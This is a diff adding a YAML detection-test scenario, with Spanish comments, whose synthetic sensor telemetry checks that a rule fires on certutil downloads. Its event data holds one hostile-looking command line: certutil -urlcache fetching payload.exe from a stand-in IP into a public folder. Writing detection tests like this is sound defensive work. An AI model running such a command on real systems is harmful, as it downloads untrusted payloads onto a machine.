@@ -1,0 +1,23 @@
+# Escenarios de validacion de deteccion (SIM-1/SIM-2).
+# Telemetria sintetica e inerte: el mismo esquema de eventos que
+# envia el sensor, sin ejecutar nada en ningun equipo. Cada escenario
+# declara las alertas que el motor DEBE disparar (shipped rule/sequence
+# id); el test de CI falla si una deja de detectarse.
+
+- name: Descarga con certutil o bitsadmin (sintetico)
+  id: sim-certutil-urlcache
+  description: 'Invocacion sintetica que valida la regla con los mismos campos que envia el sensor: descarga con
+    certutil -urlcache. Telemetria inerte; nada se ejecuta en ningun equipo.'
+  attack:
+  - t1105
+  host: LAB-SIM-CERTUTIL-URLCACHE
+  user: CORP\sim
+  expected:
+  - rule: c1d24e9b-7a03-4c56-9f11-8e2b5a4d9c73
+  events:
+  - type: process.create
+    user: CORP\sim
+    process:
+      pid: 4110
+      name: certutil.exe
+      command_line: certutil.exe -urlcache -split -f https://203.0.113.10/payload.exe C:\Users\Public\payload.exe
